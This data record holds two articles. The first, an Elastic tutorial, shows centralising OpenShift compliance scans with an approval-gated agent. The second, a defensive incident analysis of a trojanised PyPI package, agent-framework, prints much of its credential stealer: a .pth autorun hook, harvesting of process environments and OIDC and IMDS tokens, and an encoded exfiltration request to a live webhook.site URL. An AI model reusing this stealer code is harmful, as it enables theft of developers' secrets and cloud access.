articles.title: From posture to root cause: Investigate OpenShift compliance with Elastic Agent Builder
articles.context: On Elastic Cloud Serverless, these capabilities are available on supported project feature tiers (such as Serverless Security Complete)
articles.full_text:
A single Elastic Agent on each cluster polls OpenShift Compliance Operator APIs every 60 seconds. An Elastic Agent Builder agent on top of that data can tell you what change failed the compliance control. Every scan and check result lands in Elasticsearch, as do the remediations, so the agent answers questions (like, Which clusters failed checks this week? Why did a control start failing, and when?) in plain English. The rules that the scanner marks as manual get evaluated with Common Expression Language (CEL) custom rules, and a scheduled workflow in Elastic Workflows annotates the result back to the manual rule in the cluster. Rescans and remediation patches run through those same workflows and pause for your approval. Everything in this post is on GitHub, including the integration package and workflows, along with the manifests.

The Compliance Operator scans each OpenShift cluster against configured profiles covering the CIS Benchmarks, National Institute of Standards and Technology (NIST) 800-53 moderate (the basis for Federal Risk and Authorization Management Program [FedRAMP] authorization), the Australian Essential Eight and more, and then stores the results on that cluster. For one cluster, that’s fine, but across a fleet, nobody has a single view. A rule that passed last week starts failing after a deployment, and a scheduled scan silently fails to trigger. But the only way to find out is to log in and run oc get compliancecheckresult cluster by cluster.

Why OpenShift compliance is hard to track across a fleet

Scan results stored on each cluster

The Compliance Operator runs scans on each OpenShift cluster and stores the results locally. This approach works across a few clusters, but as the fleet grows, it becomes difficult for OpenShift administrators to maintain visibility across each cluster.

A compliance rule that had previously passed might start to fail after a new workload deployment or a cluster upgrade. Similarly, a scheduled scan can fail to trigger, due to unresolved dependencies. Without a central view of compliance scan status and results, these failures go unnoticed until an OpenShift administrator logs in to the cluster and manually checks, using commands such as oc get compliancecheckresult and oc get compliancescan.

In this blog post, we explore how this challenge can be addressed by ingesting OpenShift compliance data into Elasticsearch, giving platform and security teams a unified way to track compliance posture and investigate drift across the fleet.

Manual compliance rules tracked outside the cluster

Not all compliance rules are automated, so they need a manual assessment. Platform teams usually track these rules and their status in shared spreadsheets or Confluence pages. Those trackers sit apart from the scan results, and someone has to update and reconcile them with each cluster’s findings.

Organizational controls add another layer. A team may exclude certain controls from specific clusters because of internal requirements or operational needs. Without a central record, it’s hard to determine which controls apply to which cluster and why an exception exists, and that’s exactly what an auditor will ask.

Compliance reporting spread across clusters

With scan results spread across clusters, security teams have to find their own way to aggregate the data before they can build a report. Auditors can ask for reports at regular intervals, so this aggregation repeats every cycle. Each report draws on scan output and manual rule status, along with documented exceptions that live in different places. Pulling all of that together can leave gaps.

Centralizing OpenShift compliance data in Elasticsearch

Elastic Agent Builder lets you build interactive AI agents on top of your compliance data. Teams can query compliance posture across their entire fleet in plain English, investigate why specific controls failed, and safely trigger remediations with human-in-the-loop approvals, rather than combing through endless scan JSON or switching between cluster consoles.

A custom Elastic integration collects compliance scan data from each cluster and sends it to Elasticsearch. It uses the HTTP JSON input to query the OpenShift Compliance Operator APIs and retrieve scan results, in addition to ingesting them into Elasticsearch. During ingestion, compliance data is parsed and normalized, making it easier to search, build dashboards, set up alerts, and generate compliance reports.

With the data centralized, the next step is to make it easy for platform and security teams to work with it. Together, the integration and the agent turn compliance data into something that teams can interact with directly instead of static dashboards. The agent helps the team to find the information it needs and decide what to investigate next.

The following diagram illustrates the high-level architecture of the entire workflow discussed in this solution:

Note: The proof of concept (PoC) in this solution has been tested with OpenShift Local version 4.22, Compliance Operator 1.10.0, and Elastic Serverless. On Elastic Stack deployments (self-managed or Elastic Cloud Hosted [ECH]), both Agent Builder and Workflows require version 9.5 or later and an Enterprise subscription. On Elastic Cloud Serverless, these capabilities are available on supported project feature tiers (such as Serverless Security Complete).

Elastic also offers a free, 14-day Elastic Cloud trial to help you get started.

How to ingest OpenShift compliance data into Elasticsearch

We deploy Elastic Agent directly on each OpenShift cluster using a single integration policy. Every 60 seconds, the agent queries the Compliance Operator API endpoints via HTTP JSON and ships the raw scan records into Elasticsearch data streams across your entire fleet.

The integration reads three Compliance Operator resources:

Resource / API

What it provides

compliancescans.compliance.openshift.io

The scans configured in the cluster, including scan name, phase, and result.

compliancecheckresults.compliance.openshift.io

Individual check details, including rule name, status, and severity.

complianceremediations.compliance.openshift.io

Available remediations for checks, including their current state.

Because the HTTP JSON integration appends time-series documents to a data stream on every polling cycle, three Elasticsearch transforms (scans, checks, and remedy) continuously collapse each stream into dedicated latest-state indices (ospm-compliance_-latest). The checks transform deduplicates events by cluster and check resource name (metadata.name). This ensures that checks evaluated across different node roles (such as master and worker) are preserved without creating duplicate records across repeated scan cycles.

The agent queries these latest-state indices for current posture and uses the raw time-series data streams for historical investigations.

The following diagram illustrates the compliance scan data ingestion workflow from multiple OpenShift clusters into Elastic:

Note: This is a custom-built integration and isn’t officially supported by Elastic Support.

Deploy the OpenShift compliance integration in Kibana

The custom integration is a zip file package that has all the required components. To deploy the package, you can upload the package directly using Kibana UI.

The integration follows the standard Elastic package specification and bundles all the required Kibana and Elasticsearch assets into a single archive. When uploaded through the Kibana UI, the package registers three data streams with dedicated ingest pipelines, configures prebuilt dashboards, sets up latest-state index views, and installs the continuous Elasticsearch transforms that maintain current compliance posture:

OpenShift Security Posture Management │ ├── 1. Dashboards (kibana/dashboard/) │ ├── [OpenShift Compliance] Posture Overview │ ├── [OpenShift Compliance] Overall Results │ └── [OpenShift Compliance] Auto Remediations │ ├── 2. Data Views / Index Patterns (kibana/index_pattern/) │ ├── ospm-compliance-*-latest │ └── logs-openshift_security_posture_management.compliance* │ ├── 3. Data Streams (data_stream/) │ ├── compliance_check_results (with Ingest Pipeline) │ ├── compliance_scans (with Ingest Pipeline) │ └── compliance_remediations (with Ingest Pipeline) │ └── 4. Elasticsearch Transforms (elasticsearch/transform/) ├── checks ├── remedy └── scans

Download the integration from the GitHub repository.

The video below walks through deploying and configuring the custom OpenShift Security Posture Management (OSPM) integration package in Kibana Fleet. It covers setting the three compliance endpoints for scans, check results, and remediations, setting the 60-second polling interval, and mapping the orchestrator.cluster.name field from the agent's environment variables.

Configure the Compliance Operator API endpoints and polling interval

The integration has three data collection endpoints that cover compliance scans, check results, and remediations. Each endpoint builds the OpenShift API URL from environment variables that Kubernetes sets in the pod, so the same configuration works on every cluster.

For compliance check results, the URL looks like this:

https://${env.KUBERNETES_SERVICE_HOST}:${env.KUBERNETES_SERVICE_PORT_HTTPS}/apis/compliance.openshift.io/v1alpha1/compliancecheckresults

The integration polls each endpoint every 60 seconds by default. You can change the interval to match how fresh you need the data to be.

When the configuration is complete, create an Elastic Agent policy with these settings and deploy it on your OpenShift cluster to start collecting compliance data.

Deploy Elastic Agent on each OpenShift cluster

To deploy the agent and the integration:

In Kibana, create or update an Elastic Agent policy and add the OSPM integration to it. Confirm that the API endpoints and polling interval match your environment.

The integration automatically enriches each event with orchestrator.cluster.name using the CLUSTER_NAME environment variable configured on the agent.

Generate an enrollment token to be passed along with the Fleet URL endpoint.

Replace the token and Fleet URL in the following reference YAML, and deploy the Elastic Agent on the cluster.

In Fleet, check that the agent is healthy.

Once healthy, add the OSPM integration policy to the agent to start polling data.

In Kibana, open the integration’s data streams. Confirm that documents are arriving and that each one carries the expected cluster name in orchestrator.cluster.name.

Repeat these steps for every OpenShift cluster that you want to monitor, and set the matching cluster name for each environment.

To collect OpenShift compliance data, deploy Elastic Agent as a single-replica deployment on each OpenShift cluster. The manifest below runs the agent with Fleet enrollment enabled and mounts a persistent volume to preserve agent state across pod restarts. It also injects the CLUSTER_NAME environment variable. The integration uses this variable to tag every ingested event with orchestrator.cluster.name, ensuring that multi-cluster scan results remain separated in Elasticsearch.

--- apiVersion: apps/v1 kind: Deployment metadata: name: elastic-agent namespace: elastic-agent-ocp labels: app.kubernetes.io/name: elastic-agent spec: replicas: 1 selector: matchLabels: app.kubernetes.io/name: elastic-agent template: metadata: labels: app.kubernetes.io/name: elastic-agent spec: serviceAccountName: elastic-agent containers: - name: elastic-agent image: docker.elastic.co/elastic-agent/elastic-agent:9.5.5 env: - name: CLUSTER_NAME value: "<Replace-cluster-name>" #replace this with your actual cluster name # Set to 1 for enrollment into Fleet server. If not set, Elastic Agent runs standalone. - name: FLEET_ENROLL value: "1" # Set to true to communicate with Fleet with either insecure HTTP or unverified HTTPS. - name: FLEET_INSECURE value: "false" # Fleet Server URL to enroll the Elastic Agent into. # Found in Kibana: Management > Fleet > Settings. - name: FLEET_URL value: "<Replace-fleet-url>" # Enrollment token used to enroll the Elastic Agent in Fleet. - name: FLEET_ENROLLMENT_TOKEN value: "<replace-token>" resources: limits: memory: 500Mi requests: cpu: 100m memory: 200Mi volumeMounts: # Persist Elastic Agent state across pod restarts within the pod's lifetime. - name: elastic-agent-state mountPath: /usr/share/elastic-agent/state volumes: - name: elastic-agent-state persistentVolumeClaim: claimName: agent-state

Note: The above manifest is to deploy a single replica elastic agent pod to scan and ingest compliance data. For OpenShift cluster logs and metrics, use the Elastic Kubernetes integration separately.

Complete Kubernetes manifests and role-based access control (RBAC) are available in the GitHub repository.

How to automate manual OpenShift compliance rules with CEL

Starting with Red Hat OpenShift Compliance Operator version 1.10.0, CEL-based custom rules are generally available (GA). Using this feature, create a CustomRule object for rules tagged as Manual.

For example, the compliance rule accounts-restrict-service-account-tokens is common across the profiles ocp4-cis and ocp4-high. Using a CEL expression, check whether any pods have the property spec.automountServiceAccountToken set to true:

apiVersion: compliance.openshift.io/v1alpha1 kind: CustomRule metadata: name: custom-accounts-restrict-service-account-tokens namespace: openshift-compliance spec: id: xccdf_org.ssgproject.content_rule_accounts_restrict_service_account_tokens title: "Service account tokens should not be automounted unless required" severity: medium checkType: Platform scannerType: CEL expression: | pods.items.all(p, !has(p.spec.automountServiceAccountToken) || p.spec.automountServiceAccountToken == false ) failureReason: "A pod has automountServiceAccountToken set to true" inputs: - name: pods kubernetesInputSpec: apiVersion: v1 resource: pods

Note: In the custom rule above, spec.id is mapped the same as in the original rule with status of Manual.

Custom rules cannot be evaluated directly on their own; they must be enabled through a TailoredProfile object. To execute the checks, bind this TailoredProfile to a ScanSetting using a ScanSettingBinding.

For example, create a TailoredProfile named custom-ocp4-manual-rules for the custom CEL rule custom-accounts-restrict-service-account-tokens:

apiVersion: compliance.openshift.io/v1alpha1 kind: TailoredProfile metadata: name: custom-ocp4-manual-rules namespace: openshift-compliance spec: title: "Custom CEL automation for shared manual rules (cis/e8/high)" description: "Each rule is evaluated once; rationale documents which native profiles it should be patched back to." enableRules: - name: custom-accounts-restrict-service-account-tokens kind: CustomRule rationale: "applies-to: cis,high"

Using a similar pattern, CEL checks for all the rules tagged as MANUAL can be evaluated.

Note: CEL-based evaluation only supports platform type rules.

In the Elastic Workflows for live OpenShift cluster actions section, we define a workflow that reads scan data from these custom rules ingested into Elasticsearch and uses it to annotate MANUAL rules on the OpenShift Container Platform (OCP) cluster based on their custom scan status. Because the OpenShift Compliance Operator automatically propagates custom annotations from Rule custom resources (CRs) to their corresponding ComplianceCheckResult objects during scan runs, these evaluated statuses are automatically ingested into Elasticsearch on the subsequent scan cycle.

The following diagram illustrates the sequence for evaluating MANUAL compliance rules using a CEL-based check and annotating the result to the actual rule:

Build the OpenShift compliance agent in Agent Builder

Agent Builder lets you build purpose-driven AI agents connected to your Elasticsearch data. It provides four core building blocks (instructions, skills, tools, and connectors) that govern how the agent reasons and queries data, along with how it interacts with external platforms.

In this post, we build a custom OpenShift compliance agent, which reviews compliance scan data and identifies noncompliant clusters. It also evaluates failed compliance rules. Using tools, it can also trigger compliance scans and apply auto-remediation patches. Plus, it can generate operational reports.

The goal of this compliance agent is to let platform and security teams query compliance data in natural language, without writing custom queries or manually correlating results across clusters.

The following diagram illustrates the anatomy of the OpenShift compliance agent:

Set the compliance agent’s instructions and guardrails

Configuring an agent in Agent Builder starts with custom instructions, which become part of the system prompt. They set the persona and reasoning habits for everything the agent does, in addition to the guardrails. For an OpenShift compliance agent, the most important decision is what level of actions the agent is allowed to perform. This agent uses a strictly precautionary role. It reviews and queries ingested compliance data and can apply remediation patches or trigger scans on the cluster with user approval. It treats the data in Elasticsearch as the source of truth and asks for any unstated detail, such as the cluster name or scan identifier, rather than assuming defaults.

The instructions are structured in Markdown across six focused sections (goal, steps, guardrails, domain context, output conventions, and edge cases):

Section

What it covers

Goal

The agent only handles OpenShift compliance; the ingested Elasticsearch data is the source of truth.

Steps

Confirm scope, retrieve data with the provided tools, verify the results, summarize, and then ask before acting.

Guardrails

No change without explicit approval; only the provided tools; no invented IDs or remediation; and off-topic requests are declined.

Domain context

Rules that the model cannot infer from the data, such as the custom scan and how manual checks are reported.

Output conventions

Timestamps in local time, plus the ingested and original timestamps for Elasticsearch data; sources are cited.

Edge cases

Missing input means ask; a failed or empty tool result is stated, never read as "compliant."

This excerpt from the directives and guardrails shows the tone:

# Guardrails - **Cluster Mapping**: Cluster name provided by the user must match orchestrator.cluster.name exactly as recorded in compliance data. - **Silent Exclusion of Custom Scans**: By default, completely omit and suppress any scan or check result where scan_name contains custom (case-insensitive *custom*). Do NOT list, mention, or show an "Excluded custom scans" section or table in the output. Filter them out completely silently. Only include them if the user explicitly requests custom scans. - **Handling Manual Rules**: Treat OpenShift's base status MANUAL as manual review. If a custom automated evaluation exists, read manual_scan_status (PASS/FAIL) and last_manual_scan timestamp and report that custom evaluation separately. If absent, report "no manual scan annotation recorded". - **Strict Read-Only Workload Investigation**: When investigating which workload or pod caused a rule to fail, the agent operates in strictly read-only mode. The agent must NEVER mutate, patch, or change application workloads. It identifies the root cause and user attribution, and provides the remediation steps for the OpenShift administrator to execute. - **Safety**: Never execute live cluster changes or scans without presenting the plan and receiving explicit user confirmation. - **Concise Communication**: Answer directly and concisely using clear Markdown tables. Do not ask follow-up questions or offer unsolicited next steps unless clarification is strictly necessary to answer the prompt.

The instructions also carry domain context that a model cannot infer from the data. In OpenShift clusters, a custom scan bound to the custom-ocp4-manual-rules tailored profile tests manual rules. The agent leaves it out of summaries and counts unless the user asks for it.

For manual checks in the other scans, the agent reports two statuses side by side: the original status (MANUAL); and the manual scan status from the annotation that a scheduled Elastic workflow writes back to the cluster. Putting these rules in the instructions keeps them in one place, so no tool or skill needs to repeat them. Also, the whole block is static, with no timestamps or session IDs, so prompt caching keeps working.

Add skills for posture, failure investigation, and reporting

Custom instructions are loaded on every turn, making them ideal for general guardrails and domain context. However, adding detailed task workflows to system instructions creates unnecessary prompt overhead. Instead, define modular skills that the agent loads dynamically when the user request matches the skill description.

The OpenShift compliance agent uses four skills, each covering a single responsibility:

Skill

Reads from

What it does

Posture summary

Latest-state indices

Summarizes current scan results, pass and fail counts, failed controls by severity, manual check status, and remediation state.

Failure investigation

Raw data streams

Explains why a check failed or when it started failing, using history and remediation records. Kubernetes log correlation comes once audit logs are ingested.

Live cluster actions

Live cluster, through workflows

Reads live state, triggers a rescan, and applies or reverts a remediation, always after user approval.

Reporting

Latest and raw data

Produces reports, trends, and scan comparisons, and creates dashboards after user approves.

Each skill includes a description specifying its purpose and trigger criteria. Below is the description for the Posture Summary skill:

Summarize OpenShift compliance posture, scan execution status, check results, manual rule evaluations, and remediation states from latest-state indices (ospm-compliance_*-latest).

Each skill defines its own trigger conditions, available tools, workflow rules, and decision trees, along with output standards, execution steps, examples, and edge cases. For example, the manual check logic described in the previous section is implemented as:

Manual Rules & Custom Automated Evaluations When manual rules are requested, call ocp_compliance.list_checks_by_status with status: "MANUAL". For every manual check, inspect both the base OpenShift status and the custom evaluation annotations: Report the base status as MANUAL. If manual_scan_status contains a value (e.g. PASS or FAIL), present it separately as: "Custom Evaluation Status: (last evaluated at <last_manual_scan>)". If both manual_scan_status and last_manual_scan are empty/null, explicitly state: "No manual scan annotation recorded" (indicating it still requires manual verification). Do not interpret or alter values beyond what the data fields show.

Custom ES|QL tools for querying compliance data

Skills tell the agent how to approach a task, but executing those steps requires tools to query data and perform actions. Because compliance scan data is normalized and stored in Elasticsearch, the agent uses targeted tools to search current posture and historical trends. Following are the tools configured for the compliance agent:

Tool

Type

What it does

ocp_compliance.get_scan_status

Elasticsearch Query Language (ES|QL)

Lists the scans on a cluster with result, phase, and timestamps.

ocp_compliance.list_checks_by_status

ES|QL

Lists checks with a given status, including manual scan annotations for manual checks.

ocp_compliance.list_remediations

ES|QL

Lists auto remediations with their apply flag, state, and target object.

ocp_compliance.get_rule_details

ES|QL

Looks up a specific compliance rule from latest-state data.

ocp_compliance.search_audit_logs

Index search

Searches the OpenShift cluster audit logs ingested into Elasticsearch cluster.

ocp_compliance.search_compliance_history

Index search

Offers open-ended search over the raw event history.

Elastic Workflows for live OpenShift cluster actions

Although large language models (LLMs) excel at reasoning and synthesis, you don't want an AI model improvising arbitrary mutations against a live OpenShift cluster. Elastic Workflows solves this by executing deterministic, YAML-defined steps that run identically every time. When exposed to Agent Builder as tools, the agent decides when to invoke a workflow based on your prompt but cannot alter its underlying execution logic, ensuring strict guardrails around cluster interactions.

Four workflows handle the live cluster interactions supported by the agent, alongside a scheduled automation workflow that reconciles manual rule annotations:

Workflow name

Agent tool

What it does

openshift-compliance-query-live-workload

ocp_compliance.query_live_workload

Executes a strictly read-only HTTP GET request against the live OpenShift API to inspect objects and pinpoint the offending resource.

openshift-compliance-read-live-state

ocp_compliance.live_read_state

Reads the live state of one ComplianceScan, ComplianceCheckResult, or ComplianceRemediation directly from the OpenShift API.

openshift-compliance-trigger-scan

ocp_compliance.trigger_scan

Reruns an existing ComplianceScan on the live cluster by setting the rescan annotation.

openshift-compliance-set-remediation-state

ocp_compliance.set_remediation_state

Applies (apply: true) or reverts a native ComplianceRemediation on the live cluster.

Annotate custom compliance Rule resources

N/A

Checks custom CEL rule outcomes in Elasticsearch and annotates the corresponding rule object on the OpenShift cluster.

Each workflow tool has Require user confirmation set to Always, so Agent Builder pauses and asks to approve every call.

Connect Elastic to the OpenShift API with the Kubernetes connector

The Elastic Kubernetes connector provides secure connectivity between the Elastic Stack and OpenShift API endpoints, allowing workflows to interact directly with cluster resources.

The service account token configured for the connector must follow the principle of least privilege, scoped strictly to the operations required by the workflows.

The connector needs patch permissions on the Compliance Operator custom resource definitions (CRDs), so workflows can trigger scans and apply remediations. Investigations need more than that; the agent has to read pods and service accounts, along with RBAC bindings, to find the workload behind a failed check, which also means read-only access to cluster workloads. You can grant both in two ways:

Approach

Permissions granted

When to use

Dedicated connector service account

Bound to the OpenShift view or cluster-reader ClusterRole for read-only workload queries, plus a scoped role granting patch on compliancescans and complianceremediations in compliance.openshift.io.

Production. The connector’s access is separate from the agent’s and can be audited and revoked on its own.

Extend the existing agent service account

Adds get and list on pods, serviceaccounts, and rolebindings to the existing elastic-agent-ospm ClusterRole.

PoCs and lab environments, where standing up a second service account is more setup than the exercise warrants.

The example below generates a token for the existing elastic-agent service account:

oc create token elastic-agent -n elastic-agent-ocp --duration=720h

Note: When deploying across multiple clusters or staging environments, ensure that connector-id in the workflow matches the specific Kubernetes connector configured for that cluster.

The complete OpenShift compliance agent architecture

The finished agent combines custom instructions, skills, tools, workflows, and connectors. The final structure looks like this:

The complete agent and its supporting components manifests are available in the GitHub repository.

OpenShift compliance agent demo: From failed control to root cause

The demo below follows the OpenShift compliance agent across an end-to-end investigation scenario. It shows how the agent summarizes multi-cluster posture and flags rule failures. It also demonstrates how the agent uses Elastic Workflows to query live pods without leaving the chat interface. From there, the agent correlates OpenShift audit logs in Elasticsearch to trace the exact user and deployment that caused the policy drift and documents the timeline into an Elastic case. And it shows how execution guardrails block unauthorized or destructive cluster commands.

Conclusion: OpenShift compliance monitoring at fleet scale

The OpenShift Compliance Operator does the essential work of auditing cluster configurations, but keeping a multi-cluster fleet compliant shouldn't require juggling spreadsheets or hunting down failed pods manually, nor should it force you to scramble before every audit.

Centralizing compliance findings in Elasticsearch and putting Agent Builder on top shifts the experience from static dashboards to active, evidence-backed investigation. Teams can query posture across clusters in plain English and automate manual checks with CEL and scheduled workflows. They can also trace policy drift down to the exact OpenShift user and timestamp, all while keeping humans firmly in control of live cluster changes.

articles.context: site URL | About 30 minutes after the first malicious package was published, the threat actor pushed a new version (1
articles.full_text:
The compromise, and how we detected it

Microsoft’s Agent Framework is an open-source, multi-language framework used to build and orchestrate AI agents within the Microsoft Azure ecosystem. The compromised package is the meta-package, a thin wrapper used to pull in the different framework dependencies. The agent-framework averages 196,000 downloads a month across all versions. If versions 1.26.1 or 1.26.2 touched a build agent or a laptop, assume every secret on that host is gone, and pin back to 1.26.0.

agent-framework 1.26.1 went live on PyPI at 20:35 UTC on November 17, 2026. Our supply-chain monitor flagged it as malicious at 20:41 UTC, and we published the details that evening. Version 1.26.2 followed at 21:08 UTC with the same stealer under new filenames. PyPI removed both within the hour.

Both versions shipped a .pth startup hook (a plain-text configuration file processed automatically by Python's site module every time the interpreter starts up), so the credential stealer ran every time Python started on the host. Importing the package was never necessary. It read environment variables from up to 300 running processes, Azure CLI token caches, and pip, npm, Docker, git, and Hugging Face credentials, then called Azure DevOps and GitHub Actions OIDC endpoints and the Azure Instance Metadata Service to mint fresh cloud tokens. Those tokens are how a compromised build can reach the Azure subscription behind it. Everything collected went to a single webhook[.]site endpoint, zlib-compressed and Base64-encoded.

How the agent-framework .pth hook triggers the stealer (1.26.1)

The attacker added two new files (agent_framework_meta.pth, _telemetry.py) and modified one file (__init__.py) in the 1.26.1 compromised package.

The attack is triggered by the .pth hook based on the following single line:

import agent_framework_meta

Every time Python starts, its site module processes any .pth files in the site-packages directory. Any line in these files that begins with import is executed as code, before the user’s script or any other code runs.

This import executes the package’s __init__.py, which contains a loader appended to the end of the file that imports _telemetry.py and calls its _start() function.

# Lightweight runtime diagnostics hook. try: from . import _telemetry as _telemetry _telemetry._start() except Exception: pass

The _start() function uses an environment variable, _AF_TEL, to avoid running more than once per process tree, then forks a child process and detaches it with setsid(). The child collects secrets and POSTs them to webhook[.]site while the parent continues normally, so the theft adds no visible delay. On Windows, where fork() isn’t available, it runs the collection in a background thread instead.

def _start(): if os.environ.get("_AF_TEL"): return os.environ["_AF_TEL"] = "1" try: if hasattr(os, "fork"): pid = os.fork() if pid == 0: try: os.setsid() except Exception: pass _run() os._exit(0) return except Exception: pass try: import threading t = threading.Thread(target=_run) t.daemon = True t.start() except Exception: pass

What the agent-framework credential stealer collects

Environment variables from the host and running processes

The credential stealer collects environment variables whose names contain the following strings:

TOKEN, SECRET, PASSWORD, PASSWD, KEY, CONNECTION, ENDPOINT, AZURE, AWS, GITHUB, GH_, HF_, HUGGING, OPENAI, FOUNDRY, VSS, SYSTEM, BUILD, AGENT, CI_, PIP, NPM, NUGET, COSMOS, STORAGE, SUBSCRIPTION,TENANT, CLIENT, IDENTITY,MSI,MANAGED

The stealer reads up to 300 running processes by reading /proc/<pid>/environ, keeping lines that contain secrets, including SYSTEM_ACCESSTOKEN and IDENTITY_HEADER.

for e in glob.glob("/proc/[0-9]*/environ")[:300]: try: raw = open(e, "rb").read().decode("utf-8", "replace") hits = [] for kv in raw.split("\x00"): if any(x in kv.upper() for x in ("TOKEN","SECRET","PASSWORD","KEY=","ENDPOINT_AUTH","SYSTEM_ACCESSTOKEN","IDENTITY_HEADER")): hits.append(kv[:2000]) if hits: out["env"]["PROC:" + e] = "\n".join(hits)[:12000]

Credential and configuration files on disk

The stealer checks a hardcoded list of glob patterns covering credential locations across all user home directories as well as /root. Targets include:

Azure CLI token caches (~/.azure),

Pip configuration: pip.conf, .npmrc, .netrc, .git-credentials

Docker config.json

Hugging Face tokens

Foundry configuration

.env files under /app and /workspace

Azure Pipelines agent .credentials files

Azure DevOps OIDC tokens from the pipeline endpoint

If the stealer runs inside an Azure DevOps pipeline, it uses SYSTEM_ACCESSTOKEN to call the pipeline OIDC endpoint (SYSTEM_OIDCREQUESTURI), first requesting the api://AzureADTokenExchange scope and then retrying with an empty request body. Neither request includes the serviceConnectionId parameter that Microsoft’s documented flow uses to issue a token for a specific service connection, so it is unclear whether these requests return a token that matches any federated credential.

If a usable token is obtained, whether through this request or from the environment variables exposed by Azure tasks, it could be exchanged for Microsoft Entra ID access as the identity behind the corresponding workflow identity federation service connection.

The attacker would gain that identity’s Azure role assignments, which may be limited to a single resource group or extend to an entire subscription, depending on how the service connection was configured.

at = os.environ.get("SYSTEM_ACCESSTOKEN") or os.environ.get("SYSTEM_ACCESSTOKEN") or "" oe = os.environ.get("SYSTEM_OIDCREQUESTURI") or "" if oe and at: attempts = [ ("?api-version=7.1", {"scopes": ["api://AzureADTokenExchange"]}), ("?api-version=7.1", {}), ] for suffix, body in attempts: try: # Request an OIDC token, authenticating with the pipeline's own access token req = urllib.request.Request( oe + suffix, data=json.dumps(body).encode(), headers={ "Authorization": "Bearer " + at, "Content-Type": "application/json", }, method="POST", ) resp = urllib.request.urlopen(req, timeout=15) out["ado"]["oidc"] = resp.read().decode("utf-8", "replace")[:20000] # Stop after the first successful response if out["ado"]["oidc"]: break except Exception as ex: out["ado"].setdefault("oidc_err", []).append(str(ex)[:300])

Azure managed identity tokens via IMDS

If the stealer is running on an Azure resource with a managed identity, it requests access tokens for that identity. On App Service and similar platforms, it uses the local identity endpoint (IDENTITY_ENDPOINT or MSI_ENDPOINT), and otherwise it queries the Azure Instance Metadata Service (IMDS) at 169.254.169[.]254. It requests a separate token for each of 12 resources, including:

Azure Resource Manager

Microsoft Graph

Key Vault

Storage

Azure AI Foundry

Azure Machine Learning

Container Registry

Azure DevOps (499b84ac-1321-427f-aa17-267ca6975798)

Each token lets the attacker act as the managed identity against that service for as long as the token remains valid, with whatever permissions the identity has been granted. The stealer also collects IMDS instance metadata, such as the subscription ID, resource group, and VM name, which tells the attacker exactly which environment the stolen tokens belong to.

Exfiltration to adversary-controlled infrastructure

The collected data, including the host context such as the hostname, username, and working directory, command-line arguments, and timestamp, is all bundled in a single POST request. This data is serialized to JSON, compressed with zlib, and Base64-encoded. The result is sent as the body in the outbound request to https://webhook[.]site/d381fd80-ec62-42ad-8f5c-d1b15103c9bb?t=telemetry with a User-Agent of af-runtime-diagnostics/1.

_ENC = "aHR0cHM6Ly93ZWJob29rLnNpdGUvZDM4MWZkODAtZWM2Mi00MmFkLThmNWMtZDFiMTUxMDNjOWJi" # https://webhook[.]site/d381fd80-ec62-42ad-8f5c-d1b15103c9bb def _post(tag, data): try: import urllib.request u = base64.b64decode(_ENC).decode() body = base64.b64encode(zlib.compress(json.dumps(data, default=str).encode("utf-8", "replace"), 9)) req = urllib.request.Request(u + "?t=" + tag, data=body, headers={"Content-Type": "application/octet-stream", "User-Agent": "af-runtime-diagnostics/1"}) urllib.request.urlopen(req, timeout=25).read() except Exception: pass

What changed in agent-framework 1.26.2

| | 1.26.1 | 1.26.2 | | :---- | :---- | :---- | | Published (UTC) | 2026-11-17 20:35 | 2026-11-17 21:08 | | Startup hook | agent_framework_meta.pth | af_runtime_diag.pth | | Stealer module | agent_framework_meta/_telemetry.py | af_runtime_diag.py | | Exfil User-Agent | af-runtime-diagnostics/1 | runtime-diagnostics/1 | | Wheel SHA-256 | d27fa344…e989e110 | 3d20a8bc…c9f7e0a9 | | GitHub Actions OIDC | No | Yes | | Exfil endpoint | Same webhook.site URL | Same webhook.site URL |

About 30 minutes after the first malicious package was published, the threat actor pushed a new version (1.26.2), restructuring how the attack chain loads and adding a new GitHub Actions collector. The attacker modified the package with a new .pth hook (af_runtime_diag.pth) and a new Python module (af_runtime_diag.py)

import af_runtime_diag

The Python module (af_runtime_diag.py) contains the exact same stealer code, except for the new addition of targeting GitHub Actions.

u = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL") or "" t = ( os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN") or os.environ.get("ACTIONS_RUNTIME_TOKEN") or "" ) if u and t: for aud in ("api://AzureADTokenExchange", "https://management.azure[.]com/"): try: # Append the requested audience to GitHub's OIDC token endpoint sep = "&" if "?" in u else "?" uu = u + sep + "audience=" + urllib.parse.quote(aud, safe="") req = urllib.request.Request( uu, headers={ "Authorization": "Bearer " + t, "Accept": "application/json", "User-Agent": "runtime-diagnostics/1", }, ) resp = urllib.request.urlopen(req, timeout=12) out["gh_oidc"][aud] = resp.read().decode("utf-8", "replace")[:20000] except Exception as ex: out["gh_oidc"].setdefault("err", []).append(aud + ":" + str(ex)[:200])

Both of the malicious releases point to the same exfiltration endpoint (https://webhook[.]site/d381fd80-ec62-42ad-8f5c-d1b15103c9bb?t=telemetry).

Hunting queries for the agent-framework stealer

The following hunting queries can be used to find the associated activity:

FROM logs-endpoint.events.file-* | WHERE event.action == "creation" | WHERE file.name IN ( "agent_framework_meta.pth", "_telemetry.py", "af_runtime_diag.pth", "af_runtime_diag.py" )

FROM logs-endpoint.events.network-* | WHERE dns.question.name == "webhook[.]site"

Elastic Defend has coverage for this supply-chain compromise through the following rules:

Elastic Defend Alert from Package Manager Install Ancestry

Suspicious Instance Metadata Service (IMDS) API Request

Package Runtime Secret File Access Followed by IMDS Request

How to respond to the agent-framework supply-chain compromise

Check for impact by searching the following files in site-packages folders (agent_framework_meta.pth, af_runtime_diag.pth).

Pin the clean build of agent-framework (1.26.0).

Treat everything readable on impacted hosts as compromised. This includes environment variables of all running processes, credential and configuration files, cached cloud and CLI tokens, and any secrets exposed to builds or workloads on the host. Rotate long-lived secrets and review activity for short-lived tokens that can’t be revoked.

Search proxy, DNS, or firewall logs to webhook[.]site using User-Agents (af-runtime-diagnostics/1, runtime-diagnostics/1).

Consider adding a delay before adopting newly published packages, since this attack was caught and removed within hours.

articles.title: Inside the loop: Five AI attack frameworks that never ask permission

articles.full_text:
